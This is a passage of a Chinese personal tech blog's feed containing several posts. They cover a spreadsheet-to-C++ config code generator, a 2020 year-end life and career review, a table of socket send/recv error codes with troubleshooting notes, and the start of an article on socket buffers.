&lt;map&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ################## 以下是自动生成的代码 ##################</span><br><span class="line">&#x2F;&#x2F; ## 比赛系统  lijunshi2015@163.com</span><br><span class="line"></span><br><span class="line">static std::map&lt;int, std::map&lt;std::string, std::string&gt; &gt; time_conf &#x3D; </span><br><span class="line">&#123; &#123;% for v in content.list %&#125;</span><br><span class="line">&#123; &#123;&#123;v.id&#125;&#125; , &#123; </span><br><span class="line">&#123;&quot;season_name&quot;, &quot;&#123;&#123;v.season_name&#125;&#125;&quot; &#125; ,</span><br><span class="line">&#123;&quot;release_start&quot;, &quot;&#123;&#123;v.release_start&#125;&#125;&quot; &#125; ,</span><br><span class="line">&#123;&quot;release_end&quot;, &quot;&#123;&#123;v.release_end&#125;&#125;&quot; &#125; ,</span><br><span class="line">&#123;&quot;exchange_end&quot;, &quot;&#123;&#123;v.exchange_end&#125;&#125;&quot; &#125; ,</span><br><span class="line">&#123;&quot;turnplate_id&quot;, &quot;&#123;&#123;v.turnplate_id&#125;&#125;&quot; &#125; ,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,&#123;% endfor %&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::map&lt;int, std::map&lt;std::string, std::string&gt; &gt; get_conf()</span><br><span class="line">&#123;</span><br><span class="line">return time_conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ################## 以上是自动生成的代码 ##################</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ################## 以下是手工编写部分 ##################</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>业务代码调用数据配置文件的实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;map&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;auto_codes&#x2F;game_time_conf.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">std::map&lt;int, std::map&lt;string, string&gt; &gt; my_conf &#x3D; get_conf();</span><br><span class="line">printf(&quot;%s\n&quot;, my_conf[2101][&quot;season_name&quot;].c_str());</span><br><span class="line">printf(&quot;%s\n&quot;, my_conf[2102][&quot;release_start&quot;].c_str());</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>项目路径：<a href="https://github.com/AstarLight/xls2code">https://github.com/AstarLight/xls2code</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>游戏开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年终总结：重新上路</title>
    <link href="/2021/01/02/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%EF%BC%9A%E9%87%8D%E6%96%B0%E4%B8%8A%E8%B7%AF/"/>
    <url>/2021/01/02/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%EF%BC%9A%E9%87%8D%E6%96%B0%E4%B8%8A%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>以前都会在新年前1天的晚上总结一年，但是19年因为特殊原因中断了这个习惯，不过从今年起这个习惯得重新启动起来，毕竟自己的年度总结对自而言意义非凡。总结一年的收获和成长，展望计划新的一年，总结和计划，是个人成长的重要阶段。</p><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>2020年个人一个很大的改变就是换工作了，2019年自己硕士毕业，在工作一年后重新思考的自己发展和个人成长，在定居城市、技术团队和发展方向上也做了很大的改变：</p><ol><li>从深圳撤离，回到自己读书生活了7年的广州，以广州作为自己未来的定居城市。这个决定也是思考了很久，如果从工作机会上看，深圳有着更多的发展机会：腾讯、阿里、百度、华为、字节跳动、shoppee等都是一些不错的互联网公司。反观广州，工作机会就少了很多：腾讯、网易游戏、YY、bigo、虎牙等这些都算是知名的互联网企业。从工作机会上深圳更优，但从生活气息上和生活舒适度上，广州完胜深圳。因为自己在广州已经读书生活了7年了，直到硕士毕业才离开广州去到深圳生活了一年，刚到深圳时觉得深圳是个年轻、干净、有发展潜力、适合年轻人奋斗的大城市，但待久了就会觉得，深圳这城市还真的是奋斗之都，除了工作，生活就只剩无几了。后面发现深圳房价越来越夸张，眼看已经控制不住了（宝安这个鬼地方都8万起了），这导致我越发的焦虑，让我不得不重新思考了自己的定居城市，反复考虑觉得，广州才是自己的归属地，所以狠下心回到了广州。回到广州半年了，感觉一切都是那么的熟悉，还是广州能给自己生活的感觉，因为广州房价不高的原因，自己买房扎根也是未来可期。</li><li>公司从Q音到网易游戏，工作领域从互联网研发到游戏研发，工作挑战也发生了改变，但相同的是，无论是Q音还是现在的梦幻西游，都是一款超级成熟的产品，都是15年以上的老产品了，正因为产品成熟，所以技术上有很多可以借鉴学习的成功经验，因为代码里都有各代技术人优化的痕迹。产品过于成熟带来的一个问题就是，代码历史背负比较大，很多的开发都需要以兼容老代码老架构为主，在新技术新架构的尝试颇为难推进。</li><li>因为换了团队，团队的技术风格转变十分明显，现在的团队在技术上的氛围，确实更为优秀。无论是周会技术分享、新成员的培养、新技术新工具的推进和落地、code review的执行力，都让自己感到这确实是个搞技术的团队，另外，现在的团队很像学生时代的实验室，聚集了闷骚的技术男，专心忙自己的工作，有事帮忙喊一句就会过来，直到今天，我对团队还是十分的满意了。</li><li>发展方向因为工作领域的改变而有所变化，但是感觉还是变化不大。有人总说，互联网后台跟游戏服务器是两个不同的技术栈，但因为自己刚好在这两个行业都呆过，自己深刻的意识到：技术栈基本一致。无论是互联网后台还是游戏服务器，技术栈都是高度重合：语言C/C++,GO,Python都在大量使用；无论是互联网后台还是游戏，微服务、docker、k8s都在广泛使用；开源组件上，大家都重度依赖Mysql,Mongodb,Redis,kafka等。如果说不同点话，互联网后台的最大挑战是高并发，优化点是分布式系统各个节点，而游戏服务器的难点在于单机性能，优化的方向是怎么压榨单机的极限性能。互联网后台服务是无状态服务，读多写少，而游戏服务器更多的是有状态的，逻辑写多读少为主，所以在数据库处理思路上并不一致。另外，游戏服务器开发也有自己独有的挑战领域：网络同步和AOI。而且游戏玩法逻辑比一般的互联网产品的业务逻辑都要复杂的多。</li></ol><h2 id="技术成长"><a href="#技术成长" class="headerlink" title="技术成长"></a>技术成长</h2><p>2020年技术上算是有些长进，上半年因为疫情的原因，在家呆了比较久，因此也有充足的时间学习技术，后面来到新团队后，也学习了比较多游戏服务器上的设计。总结来说，2020年在这些技术知识点上是有不少长进：</p><ol><li>Mysql</li><li>Linux性能优化</li><li>协程</li><li>网络协议，网络编程</li><li>互联网后台架构，高性能服务</li><li>kafka</li><li>go</li><li>shell</li><li>游戏服务器架构</li><li>磁盘IO</li></ol><h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><p>从17年开始，自己都坚持写技术文章，尤其在研究生期间写了大量的总结文章，但是2019年却一篇文章都没有写，一个很好的习惯却中断了。2020年初才重新开始写技术文章，把自己日常技术学习思考总结为文章分享出去。2020年写作方面自己比较满意的两个事情就是：</p><ol><li>年初疫情在家时写的一篇关于Mysql的文章，分享到腾讯内网，昨天被评为年度十大热门文章；</li><li>搭建了这个独立博客，至今发表了好几篇文章，至少自己的写作习惯又重新坚持下来了。</li></ol><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>从深圳回到广州后，自己更懂得生活了，更懂得工作之外的自己，该如何体验生活，寻找生活的乐趣。</p><ol><li>登山徒步。跟公司同事尝试了一次高强度的徒步登山活动，从早上8点上山到下午4点下山，微信步数3W，下山时整个脚已经麻木了，但是这确实是个自己从来没过的生活体验。不过由于徒步登山实在强度太大，后面就再也没参与过了。</li><li>剧本杀。最近两个月迷上了剧本杀，开启了新的生活体验，同时也结识了一群同样爱好的朋友。现在周末基本都会来一局，基本上一局就是6个小时了，2点到晚上8点，玩得不亦乐乎，剧本杀在逻辑推理和口头表达上会有不少挑战。</li><li>看房。回到广州后，自己有空就会去各大楼盘逛一逛，看看楼市行情，虽然至今还没上车，但是看房这半年自己房地产相关的知识增长不少，无论是法律方面还是金融方面，或者是房地产商的开发风格，都有所了解了，正因为有了购房需求，逼着自己去了解更多这方面相关的知识，这也算是人生阅历快速增长的推动力。</li><li>基金。2020年才开始接触基金，以前因为缺乏这方面的知识，所以一直没有买基金或股票。今年开始，自己对这理财开始觉悟，开始关注这方面的知识，所以也看了一些书，了解了一些理财方面的学问，开始把自己固定储蓄改为基金投资。一年过去了，收益也接近于10%，也算及格吧。不过前期还是踩了一些坑，比如没有做调研就买了一个网红基金，最近跌得可惨了。不过其他有做功课的基金成长都不错，所以买基金这事情，还得多做功课才可下手，另外买一些经受过时间考验的明星老基金总不会错。</li></ol><h2 id="新的一年，新的计划"><a href="#新的一年，新的计划" class="headerlink" title="新的一年，新的计划"></a>新的一年，新的计划</h2><p>2020年前半年过得有点坎坷，但下半年过得也算顺风顺水。上半年属于人生的振荡期，下半年一切都稳定起来了都好起来了，生活也逐渐有了起色，生活气息味越来越浓了。2021年给自己定个计划，1年后看看自己的实现情况。</p><ol><li>买房。2021年希望遇到合适的小区合适的房子，然后下手把人生中的这件大事完成了。</li><li>理财更上一步。希望2021年基金理财年收益能去到15%。</li><li>健康运动。每周坚持2次健身房，把身体练好，工作后小肚子越来越大了，身体机能也大不如前，希望2021年自己能把精力放一点在健康上，把身体体态打造好。</li><li>技术上想要涉猎的领域：游戏服务器架构、游戏同步、AOI、mongodb底层原理、gRpc的底层实现、go的学习、性能分析工具学习、协程实现。</li><li>技术级别提升。</li><li>技术文章坚持2周一篇。</li></ol>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从socket系统调用错误码分析网络异常</title>
    <link href="/2020/12/28/%E4%BB%8Esocket%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%94%99%E8%AF%AF%E7%A0%81%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C%E5%BC%82%E5%B8%B8/"/>
    <url>/2020/12/28/%E4%BB%8Esocket%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%94%99%E8%AF%AF%E7%A0%81%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<p>在进行网络编程中，经常会遇到一些奇怪的网络异常或错误，这些错误其实通过分析socket 的send和recv函数的返回值和错误码就可以得到具体的错误原因，进而可以对症下药解决网络问题。</p><h2 id="send的返回值分析"><a href="#send的返回值分析" class="headerlink" title="send的返回值分析"></a>send的返回值分析</h2><table><thead><tr><th>返回值</th><th>错误码</th><th>含义</th><th>解决措施</th></tr></thead><tbody><tr><td><div style="width: 20pt">&gt;0</div></td><td><div style="width: 100pt">无</div></td><td>返回值表示成功拷贝到发送缓冲区的字节数</td><td>无</td></tr><tr><td>=0</td><td>无</td><td>发送的数据长度为0</td><td>检查发送的数据是否为空</td></tr><tr><td>-1</td><td>EACCES</td><td>SO_BROADCAST没被设置却尝试向一个广播地址发送数据</td><td>检查发送地址是否正确，或设置SO_BROADCAST</td></tr><tr><td>-1</td><td>EAGAIN</td><td>非阻塞模式读操作被阻塞或者读超时</td><td>正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次</td></tr><tr><td>-1</td><td>EWOULDBLOCK</td><td>非阻塞模式下无数据可读或接收操作被阻塞或者接收超时</td><td>正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次</td></tr><tr><td>-1</td><td>EBADF</td><td>使用的sockfd是无效</td><td>检查socket的建立是否成功</td></tr><tr><td>-1</td><td>ECONNRESET</td><td>本连接收到了rst包，对方异常关闭了双方连接，本连接已经关闭了</td><td>Connection reset by peer，在收到RST后的socket继续发送数据，会生成SIGPIPE信号, 导致进程退出（默认的系统处理SIGPIPE信号的方式） 。如果对 SIGPIPE 进行忽略处理， 二次调用write方法时, 会返回-1, 同时errno置为SIGPIPE。这类情况的处理方法是遇到ECONNRESET的错误码就调用close关闭连接。</td></tr><tr><td>-1</td><td>EFAULT</td><td>访问了无效的用户地址空间，即指向缓冲区的指针有误</td><td>检查缓冲区指针是否有分配空间，空间是否异常回收了</td></tr><tr><td>-1</td><td>EHOSTUNREACH</td><td>对方地址不可达</td><td>检查一下对方的网络状态,如ping探测一下</td></tr><tr><td>-1</td><td>EINTR</td><td>由于信号中断，没写成功任何数据。</td><td>正常，本次调用没有写入任何数据到发生缓冲区，下次调用需要再次写入</td></tr><tr><td>-1</td><td>EMSGSIZE</td><td>发送的数据过大，无法发送</td><td>出现在UDP发送数据时，发送的数据大于MTU 1500字节时发生，可以 调整发送数据的大小，分批发送；或者调大MTU，但不推荐</td></tr><tr><td>-1</td><td>ENETDOWN</td><td>本地网络接口无法正常工作</td><td>检查网卡，检查网络是否正常</td></tr><tr><td>-1</td><td>ENETUNREACH</td><td>无网络路由</td><td>检查路由</td></tr><tr><td>-1</td><td>ENOBUFS</td><td>网卡的发送队列已满，一般表示网卡无法发送数据了</td><td>UDP头域有一个16bit的字段用于标识UDP的包大小，所以一个UDP包数据长度最大为65K</td></tr><tr><td>-1</td><td>EPIPE</td><td>尝试往一个已经断开的socket发送数据，第一次会产生ECONNRESET，如果后续继续这样做，系统会产生SIGPIPE信号通知线程，错误码变为EPIPE</td><td>会产生broken pipe的错误，正确处理方式是close掉这个连接。建议应用根据需要处理SIGPIPE信号，至少不要用系统缺省的处理方式处理这个信号，系统缺省的处理方式是退出进程，这样你的应用就很难查处处理进程为什么退出。</td></tr><tr><td>-1</td><td>EADDRNOTAVAIL</td><td>指定的本地地址已经不再可用了</td><td>ifconif查看自己的IP是否变化了，是否与socket使用的IP不同</td></tr><tr><td>-1</td><td>EINVAL</td><td>函数传参错误</td><td>检查传参</td></tr></tbody></table><h2 id="recv的返回值分析"><a href="#recv的返回值分析" class="headerlink" title="recv的返回值分析"></a>recv的返回值分析</h2><table><thead><tr><th>返回值</th><th>错误码</th><th>含义</th><th>解决措施</th></tr></thead><tbody><tr><td><div style="width: 20pt">&gt;0</div></td><td><div style="width: 100pt">无</div></td><td>成功接收到的数据字节数</td><td></td></tr><tr><td>0</td><td>无</td><td>对方已正常关闭连接</td><td>应用进程调用close关闭本方连接</td></tr><tr><td>-1</td><td>EAGAIN</td><td>非阻塞模式下无数据可读或接收操作被阻塞或者接收超时</td><td>正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次</td></tr><tr><td>-1</td><td>EWOULDBLOCK</td><td>非阻塞模式下无数据可读或接收操作被阻塞或者接收超时</td><td>正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次</td></tr><tr><td>-1</td><td>EBADF</td><td>使用的sockfd是无效</td><td>检查socket的建立是否成功</td></tr><tr><td>-1</td><td>ECONNRESET</td><td>本连接收到了rst包，对方异常关闭了双方连接，本连接已经关闭了</td><td>Connection reset by peer，在收到RST后的socket继续读数据，会生成SIGPIPE信号, 导致进程退出（默认的系统处理SIGPIPE信号的方式） 。如果对 SIGPIPE 进行忽略处理， 二次调用recv方法时, 会返回-1, 同时errno置为SIGPIPE。这类情况的处理方法是遇到ECONNRESET的错误码就调用close关闭连接。</td></tr><tr><td>-1</td><td>EFAULT</td><td>访问了无效的用户地址空间，即指向缓冲区的指针有误</td><td>检查缓冲区指针是否有分配空间，空间是否异常回收了</td></tr><tr><td>-1</td><td>EINTR</td><td>由于信号中断返回，没有任何数据可用。</td><td>正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次</td></tr><tr><td>-1</td><td>ENOBUFS</td><td>系统无法再分配内部缓冲区，内存不足</td><td>系统层面的问题，检查系统内存使用情况</td></tr><tr><td>-1</td><td>ENOTCONN</td><td>面向连接的socket尚未连接</td><td>检查是否判断了connet的状态，可能是connet失败了但自己还是继续调用recv读数据</td></tr><tr><td>-1</td><td>ETIMEDOUT</td><td>连接超时，TCP keepalive 超时触发</td><td>对方已经可能连接关闭了，我们调用close关闭自己的连接</td></tr><tr><td>-1</td><td>EINVAL</td><td>函数传参错误</td><td>检查传参</td></tr><tr><td>-1</td><td>ECONNREFUSED</td><td>对方拒绝网络连接</td><td>调用close关连接，检查接收方的网络访问策略</td></tr><tr><td>-1</td><td>EPIPE</td><td>尝试往一个已经断开的socket读取数据，第一次会产生ECONNRESET，如果后续继续这样做，系统会产生SIGPIPE信号通知线程，错误码变为EPIPE</td><td>会产生broken pipe的错误，正确处理方式是close掉这个连接。建议应用根据需要处理SIGPIPE信号，至少不要用系统缺省的处理方式处理这个信号，系统缺省的处理方式是退出进程，这样你的应用就很难查处处理进程为什么退出。</td></tr></tbody></table><p>特别：返回值&lt;0时并且(errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)的情况下认为连接是正常的，继续接收。</p><h2 id="总结常见的网络异常情况"><a href="#总结常见的网络异常情况" class="headerlink" title="总结常见的网络异常情况"></a>总结常见的网络异常情况</h2><h3 id="1-bind-时的address-already-used"><a href="#1-bind-时的address-already-used" class="headerlink" title="1. bind()时的address already used"></a>1. bind()时的address already used</h3><p>bind()时失败，错误码为EADDRINUSE。</p><p>原因：</p><ol><li>有线程或进程占用着该IP和端口，导致bind失败。</li><li>进程运行，然后重启了，因为有time_wait状态的存在，需要等待2msl的时间才能释放端口，在释放端口前进行bind，也会失败。</li><li>有进程使用了0.0.0.0绑定了相同的端口（0.0.0.0表示所有本地网络地址）。在默认设置下，没有socket能够绑定到同一地址的同一端口。比如在Socket A已经绑定了0.0.0.0:8000以后，Socket B若是想要绑定192.168.0.100:8000，那就会报EADDRINUSE。因为Socket A已经绑定了所有ip地址的8000端口，包括192.168.0.100:8000。</li></ol><p>地址冲突情况列举：</p><table><thead><tr><th>SO_REUSEADDR</th><th>socketA</th><th>socketB</th><th>Result</th></tr></thead><tbody><tr><td>ON/OFF</td><td>192.168.0.1:21</td><td>192.168.0.1:21</td><td>Error (EADDRINUSE)</td></tr><tr><td>ON/OFF</td><td>192.168.0.1:21</td><td>10.0.0.1:21</td><td>OK</td></tr><tr><td>ON/OFF</td><td>10.0.0.1:21</td><td>192.168.0.1:21</td><td>OK</td></tr><tr><td>OFF</td><td>0.0.0.0:21</td><td>192.168.1.0:21</td><td>Error (EADDRINUSE)</td></tr><tr><td>OFF</td><td>192.168.1.0:21</td><td>0.0.0.0:21</td><td>Error (EADDRINUSE)</td></tr><tr><td>ON</td><td>0.0.0.0:21</td><td>192.168.1.0:21</td><td>OK</td></tr><tr><td>ON</td><td>192.168.1.0:21</td><td>0.0.0.0:21</td><td>OK</td></tr><tr><td>ON/OFF</td><td>0.0.0.0:21</td><td>0.0.0.0:21</td><td>Error (EADDRINUSE)</td></tr></tbody></table><p>解决：<br>setsockopt里设置SO_REUSEADDR。设置了SO_REUSEADDR以后，判断冲突的方式就变了。只要地址不是正好(exactly)相同，那么多个Socket就能绑定到同一ip上。比如0.0.0.0和192.168.0.100，虽然逻辑意义上前者包含了后者，但是0.0.0.0泛指所有本地ip，而192.168.0.100特指某一ip，两者并不是完全相同，所以Socket B尝试绑定的时候，不会再报EADDRINUSE，而是绑定成功。另外，SO_REUSEADDR的另一个作用是，<strong>可以绑定TIME_WAIT状态的地址</strong>。</p><h3 id="2-connect-时的address-already-used"><a href="#2-connect-时的address-already-used" class="headerlink" title="2. connect()时的address already used"></a>2. connect()时的address already used</h3><p>Connect()失败，错误码为EADDRINUSE。</p><p>在默认情况下，一般在bind()时可能会出现EADDRINUSE问题，bind()时因为src ip和src port已经不同，不可能报EADDRINUSE。但是在SO_REUSEADDR和SO_REUSEPORT下，因为地址有重用，那么当重用的地址端口尝试连接同一个远端主机的同一端口时(connect()时)，就会报EADDRINUSE。</p><p>比如本机只有两个地址，127.0.0.1和192.168.0.1，其中后者是可访问因特网的网卡的地址。在SO_REUSEADDR下，并且Socket A绑定了Socket A0.0.0.0:8000, Socket B绑定了192.168.0.1:8000以后，Socket A发起了与远端主机111.13.101.208:80的连接。此时根据路由表规则，连接将被绑定到192.168.0.1，产生的连接ID为{<SOCK_STREAM>, &lt;192.168.0.1&gt;, &lt;8000&gt;, &lt;111.13.101.208&gt;, &lt;80&gt;}，Socket A连接成功。但是如果Socket B也想尝试发起与远端主机111.13.101.208:80的连接，就会产生一样的连接ID，所以报了EADDRINUSE。</SOCK_STREAM></p><p>linux kernel 3.9 引入了最新的SO_REUSEPORT选项，使得多进程或者多线程创建多个绑定同一个ip:port的监听socket，提高服务器的接收链接的并发能力,程序的扩展性更好；此时需要设置SO_REUSEPORT（注意所有进程都要设置才生效）。<br>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT,(const void *)&amp;reuse , sizeof(int));</span><br></pre></td></tr></table></figure><p>SO_REUSEPORT的三个作用：</p><ol><li>每一个进程有一个独立的监听socket，并且bind相同的ip:port，独立的listen()、accept()和connect()；提高接收连接的能力。（例如nginx多进程同时监听同一个ip:port）</li><li>避免了应用层多线程或者进程监听同一ip:port的“惊群效应”。</li><li>内核层面实现负载均衡，保证每个进程或者线程接收均衡的连接数。</li></ol><p>SO_REUSEPORT套接字选项起作用的三个前提：</p><ol><li>本选项允许完全重复的捆绑，不过只有在想要捆绑同一IP地址和端口的每个套接字都指定了本套接字选项才行。</li><li>如果被捆绑的IP地址是一个多播地址，那么SO_REUSEADDR和SO_REUSEPORT被认为是等效的</li><li>只进程用户组相同的服务器进程才能监听同一ip:port （安全性考虑），一个用户便不能窃取其他用户的端口，这一点不同于SO_REUSEADDR。</li></ol><p>现在已经存在一个没有启用SO_REUSEPORT选项的套接字，而另外一个设置了SO_REUSEPORT选项的套接字要绑定与第一个套接字相同的地址和端口，这种情况会绑定失败，就算已绑定套接字是一个处于在TIME_WAIT状态的连接，也无法成功；要绑定一个与TIME_WAIT状态相同地址和端口的套接字，要么设置在新套接字上设置SO_REUSEADDR选项，要么在原套接字和将要绑定的套接字上都设置SO_REUSEPORT选项；当然也允许同时设置SO_REUSEADDR和SO_REUSEPORT选项；</p><h3 id="4-connect-reset-by-peer"><a href="#4-connect-reset-by-peer" class="headerlink" title="4. connect reset by peer"></a>4. connect reset by peer</h3><p>这个提示的出现的情景：己方socket给对方发送数据时，对方因为异常情况回了RST包，己方系统也会关闭这个连接，回收相应的socket资源，并往上通知应用进程，当应用程序调用recv或send进行数据读写时，其返回值为-1，error被设为ECONNRESET，要求应用程序自行处理该异常。</p><p>因此，当网络编程中需要处理send()范围值为-1的异常情况，同时检查errorn是否为ECONNRESET，如果是错误码是ECONNRESET，就表明对方已经异常关闭了连接，我们系统收到RST包会也会断掉连接，此时的socket已经是不可用了。此时我们应该调用close()，结束本次通信。</p><h3 id="5-broken-pipe"><a href="#5-broken-pipe" class="headerlink" title="5. broken pipe"></a>5. broken pipe</h3><p>如果我们无视ECONNRESET错误，继续往已被RST关闭的连接发送数据时，就会触发“broken pipe”的错误提示，而且send的返回值仍为-1.error被设为EPIPE。因为该连接已经断开了，因此还往这个socket发送数据是一个未定义的行为，因此需要避免这个行为，因为很危险，可能会导致进程异常退出。因为发生这种向一个因为RST关闭的连接发送数据，系统会产生一个SIGPIPE的信号，通知进程处理，但是进程没有接管这个信号，系统默认会杀死进程。</p><p>因此针对该情况的解决方法就是，判断我们send的返回值是否为-1且error为ECONNRESET，是则马上close掉连接。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈谈socket缓冲区</title>
    <link href="/2020/12/25/%E8%B0%88%E8%B0%88socket%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    <url>/2020/12/25/%E8%B0%88%E8%B0%88socket%E7%BC%93%E5%86%B2%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p>每个socket被创建后，无论使用的是TCP协议还是UDP协议，都会创建自己的接收缓冲区和发送缓冲区。当我们调用write()/send() 向网络发送数据时，系统并不会 马上向网络传输数据，而是首先将数据拷贝到发送缓冲区，由系统负责择时发送数据。根据我们选用的网络协议以及阻塞模式，系统会有不同的处理。</p><p>这些socket缓冲区特性可整理如下：</p><ol><li>socket缓冲区在每个套接字中单独存在；</li><li>socket缓冲区在创建套接字时自动生成；</li><li>即使关闭套接字也会继续传送发送缓冲区中遗留的数据；</li><li>关闭套接字将丢失接收缓冲区中的数据。</li></ol><p><img src="/2020/12/25/%E8%B0%88%E8%B0%88socket%E7%BC%93%E5%86%B2%E5%8C%BA/1.png" alt="image"></p><h2 id="TCP阻塞和非阻塞模式下的数据发送"><a href="#TCP阻塞和非阻塞模式下的数据发送" class="headerlink" title="TCP阻塞和非阻塞模式下的数据发送"></a>TCP阻塞和非阻塞模式下的数据发送</h2><ol><li>阻塞模式下，调用write()/send()后程序将阻塞，如果发送缓冲区的可用长度大于待发送的数据，则数据将全部被拷贝到发送缓冲区，等待系统将发送缓冲区内的数据发送出去，当数据全部被拷贝到发送缓冲区后阻塞状态将消失；如果发送缓冲区的长度小于待发送的数据长度，则数据能拷贝多少就先拷贝多少（分批拷贝），一直等待直到数据可以全部被拷贝到发送缓冲区为止才可调用返回。write()/send()调用返回后并不能保证数据已经发送到对方缓冲区了，只能保证数据成功拷贝到发送缓冲区了，至于传输可靠性方面那就是由系统的协议栈来保证。</li><li>非阻塞模式下，调用write()/send()后，如果发送缓冲区剩余大小大于待发送的数据大小，那数据将完整拷贝到发送缓冲区，如果发送缓冲区剩余大小小于待发送的数据大小，那本次write()/send()则为尽可能拷贝，有多少空间就拷贝多少数据，返回值为均为成功拷贝到发送缓冲区的数据长度。</li><li>当接收端不接收数据，或者处理速率比发送方的发送速率低导致其接收缓冲区已满（接收窗口win=0），进而导致数据发送方的发送缓冲区的数据不断堆积进而缓冲区满，此时我们再调用write()/send()都将阻塞等待。</li><li>系统将发送缓冲区的数据通过网卡发到网络了，系统也不会立即将刚发送的数据从缓冲区中移除，只有当接收方回复了ack，我们才能认为对方收到了我们发送的信息，否则刚发送的数据必须还保留在发送缓冲区等待重传。当系统收到接收方对刚发送数据的ack后，才会移除发送缓冲区内对应的数据，腾出空间。</li><li>当启用了Nagle算法后，数据会倾向于堆积到一定大小或超时后才真正往网络发送数据，因此启用Nagle算法后的发送缓冲区更容易发生数据堆积。</li><li>因为发送缓冲区满导致write()/send()一直无法返回，这个可以通过setsockopt的参数 SO_SNDTIMEO来做超时处理，如果有数据成功拷贝到发送缓冲区，那超时后的返回值是成功拷贝到发送缓冲区的数据长度，如果没有数据拷贝成功，此时的超时后返回值为-1，errno为EAGAIN 或 EWOULDBLOCK，表现就是跟非阻塞模式的write()/send()是一样的。如果不设置默认就是永不超时。</li><li>socket关闭时，但发送缓冲区中的数据仍未完全成功发送出去，那么这些数据将由系统负责把数据可靠地发送给对方。</li></ol><h2 id="TCP阻塞和非阻塞模式下的数据接收"><a href="#TCP阻塞和非阻塞模式下的数据接收" class="headerlink" title="TCP阻塞和非阻塞模式下的数据接收"></a>TCP阻塞和非阻塞模式下的数据接收</h2><ol><li>调用read()/recv()时，如果模式选择的是阻塞模式，那么当接收缓冲区没数据时，程序就会一直拥塞等待，直到有数据可读为止，每次读的数据大小由进程控制，一般都需要分批读取，read()/recv()成功返回时的返回值是成功读取到的数据的长度；如果模式选择的是非阻塞模式，那么程序调用read()/recv()调用返回的返回值是成功读取的字节数，如果没数据可读时同样是马上返回，此时的返回值为0。</li><li>当程序并没有及时读取接收缓冲区中的数据，那缓冲区可利用的空间逐渐变小，直到缓冲区满，但TCP套接口接收缓冲区不可能溢出。这是因为TCP有流量控制策略，根据TCP的流量控制中滑动窗口机制，接收方会捎到窗口大小给发送方，如果缓冲区空间为0发送方也能及时知道停止发送。</li><li>当socket关闭时，如果接收缓冲区还有数据没读取，那么这部分数据将被丢弃。</li><li>跟TCP阻塞写相同，我们可以通过setsockopt的参数 SO_SNDTIMEO来对阻塞模式的读做超时处理，如果一段时间内没有数据读取成功，此时的超时后返回值为-1，errno为EAGAIN 或 EWOULDBLOCK。</li><li>recv的第四个参数若为MSG_WAITALL，则在阻塞模式下不等到指定数目的数据不会返回，除非超时时间到。当然如果对方关闭了，即使超时时间未到，recv 也返回0。</li></ol><h2 id="UDP阻塞和非阻塞下的数据发送接收"><a href="#UDP阻塞和非阻塞下的数据发送接收" class="headerlink" 